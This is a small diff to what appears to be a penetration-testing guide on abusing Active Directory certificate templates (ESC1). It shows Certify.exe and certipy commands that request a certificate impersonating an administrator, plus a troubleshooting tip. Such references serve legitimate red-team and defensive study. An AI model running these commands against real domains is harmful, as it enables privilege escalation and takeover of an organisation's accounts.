@@ -28,7 +28,9 @@
 
  - Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
 
- - certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
+ - certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'VULN_TEMPLATE' -upn 'administrator@corp.local'
+
+## Note: If you get the error The NETBIOS connection with the remote host timed out. please rerun the command.
 
 #### 3) Use OpenSSL and convert the certificate, do not enter a password
 
